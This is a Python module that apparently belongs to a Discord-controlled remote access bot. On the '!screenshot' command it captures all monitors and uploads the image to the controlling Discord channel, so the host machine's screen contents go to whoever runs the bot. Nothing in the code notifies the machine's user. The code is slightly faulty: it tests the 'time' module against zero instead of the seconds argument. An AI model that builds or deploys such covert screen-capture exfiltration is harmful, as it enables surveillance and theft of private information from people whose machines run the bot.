# Module: screenshot
# Description: Takes a screenshot and sends it back
# Usage: !screenshot or !screenshot secondsToScreenshot
# Dependencies: time, os, mss

import time, os, discord
from mss import mss
from lib.reco_embeds import recoEmbeds as rm


async def screenshot(ctx, seconds=0):
    if os.path.isfile('screenshot.png'):  # Check if a screenshot.png exists, if yes, delete it so it can be replaced
        os.remove('screenshot.png')
    await rm.msg(ctx,"**Taking a screenshot.**")
    if time != 0:
        time.sleep(seconds)
    with mss() as sct:
        filename = sct.shot(mon=-1, output='screenshot.png')
    await ctx.send(file=discord.File('screenshot.png'))
